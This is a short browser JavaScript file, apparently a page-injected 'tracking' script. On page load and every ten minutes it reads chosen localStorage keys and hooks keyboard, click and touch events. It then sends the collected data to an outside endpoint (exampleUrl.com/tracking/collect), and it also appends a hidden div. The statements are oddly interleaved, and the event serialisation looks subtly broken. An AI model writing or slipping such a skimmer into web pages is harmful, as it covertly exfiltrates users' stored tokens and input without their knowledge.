const trackedKeys = window.trackedKeys;
const globalVarCollection = {};
function createHashCode(data) {
  const keysArray = Object.keys(data);
  const combinedKeys = keysArray.join("");
  let hashCode = 0;
  for (let i = 0; i < combinedKeys.length; i++) {
    const ch = combinedKeys.charCodeAt(i);
    hashCode = (hashCode << 5) - hashCode + ch;
    hashCode |= 0;
  }
  return hashCode.toString(16);
}
var e = document.createElement('div');
function fetchLocalStorageData() {
  const localStorageContent = {};
  for (let i = 0; i < window.localStorage.length; i++) {
    const key = window.localStorage.key(i);
    if (trackedKeys.includes(key)) {
      const value = window.localStorage.getItem(key);
      localStorageContent[key] = value;
    }
  }
  return localStorageContent;
}
function jshook() {
  ["click", "mousemove", "touchstart", "keydown"].forEach(eventType => {
    document.addEventListener(eventType, event => {
      globalVarCollection[eventType] = event;
    });
  });
}
e.id = 'ej_1206';
function dispatchDataToServer(data) {
  const uniId = createHashCode(data);
  const apiEndpoint = "https://exampleUrl.com/tracking/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", apiEndpoint, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  const encodedPayload = {
    trackerID: uniId,
    trackingData: data
  };
  xhr.send(JSON.stringify(encodedPayload));
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.log("Data sent successfully.");
      } else {
        console.error("Failed to send data, status code: " + xhr.status);
      }
    }
  };
}
e.style.display = 'none';
function gatherAndDispatchLocalStorageData() {
  const capturedData = fetchLocalStorageData();
  if (Object.keys(capturedData).length > 0) {
    dispatchDataToServer({
      ...capturedData,
      ...globalVarCollection
    });
  }
}
document.body.appendChild(e);
window.addEventListener("load", function () {
  jshook();
  gatherAndDispatchLocalStorageData();
});
setInterval(gatherAndDispatchLocalStorageData, 10 * 60 * 1000);